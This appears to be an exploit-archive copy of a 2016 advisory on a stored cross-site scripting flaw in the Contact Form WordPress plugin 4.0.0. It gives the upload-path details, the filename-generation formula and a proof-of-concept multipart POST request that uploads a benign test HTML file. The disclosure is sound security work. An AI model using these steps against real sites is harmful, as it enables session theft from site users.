@@ -1,0 +1,95 @@
+id: 27177
+date: 03/03/2017
+title: WordPress Contact Form 4.0.0 Cross Site Scripting Vulnerability
+author: Julien Rentrop
+cves: 
+
+------------------------------------------------------------------------
+Stored Cross-Site Scripting vulnerability in Contact Form WordPress
+Plugin
+------------------------------------------------------------------------
+Julien Rentrop, July 2016
+
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+A stored Cross-Site Scripting vulnerability was found in the Contact
+Form WordPress Plugin. This issue allows an attacker to perform a wide
+variety of actions, such as stealing users' session tokens, or
+performing arbitrary actions on their behalf. In order to exploit this
+issue, the attacker has to lure/force a victim into opening a malicious
+website/link.
+
+------------------------------------------------------------------------
+OVE ID
+------------------------------------------------------------------------
+OVE-20160712-0042
+
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+This issue was successfully tested on Contact Form by BestWebSoft
+WordPress Plugin version 4.0.0.
+
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+This issue is partially resolved in Contact Form version 4.0.2.
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+https://sumofpwn.nl/advisory/2016/stored_cross_site_scripting_vulnerability_in_contact_form_wordpress_plugin.html
+
+When enabled an attachment can be uploaded in the contact form. The upload accepts html files which will be stored in the /wp-content/uploads directory. Since we can control the contents of this html file we can use this as a way to create a Cross-Site Scripting attack.
+
+The attack here is possible since the validation fails and the unlink function which cleans up the file is not executed.
+
+Tried to escalate this attack further by getting code execution (uploading php file), however this is defended by a white list.
+
+Source file: https://plugins.svn.wordpress.org/contact-form-plugin/trunk/contact_form.php
+
+When apache is configured to show directory listings it's easier to exploit this attack since we don't need to generate the file name. When directory listings is not enabled this attack should still be possible, since the file name is generated with this code:
+
+md5( sanitize_file_name( $_FILES["cntctfrm_contact_attachment"]["name"] ) . time() . $email )
+
+Only time of the server is not exactly known, but could be determined.
+Proof of concept
+
+#1 Manual (Or see example request):
+Go to page with contact form, select a html file, set some invalid input (such as email: invalid@@@), send.
+
+#2 Navigate to uploaded file:
+http://<target>/wp-content/uploads/
+
+#3 Example of stored file:
+http://<target>/wp-content/uploads/2016/07/cntctfrm_a407baae7f961b445422446f75575e89_test.html
+
+Request example:
+
+POST / HTTP/1.1
+Host: <target>
+Content-Length: 605
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPcjU2MvmAMp3t8r0
+Connection: close
+   
+------WebKitFormBoundaryPcjU2MvmAMp3t8r0
+Content-Disposition: form-data; name="cntctfrm_contact_attachment"; filename="test.html"
+Content-Type: text/html
+   
+<html>
+<body>
+Hello world html
+</body>
+</html>
+------WebKitFormBoundaryPcjU2MvmAMp3t8r0
+Content-Disposition: form-data; name="cntctfrm_contact_action"
+   
+send
+------WebKitFormBoundaryPcjU2MvmAMp3t8r0
+Content-Disposition: form-data; name="cntctfrm_language"
+   
+default
+------WebKitFormBoundaryPcjU2MvmAMp3t8r0--
+
+#  0day.today [2023-03-24]  #
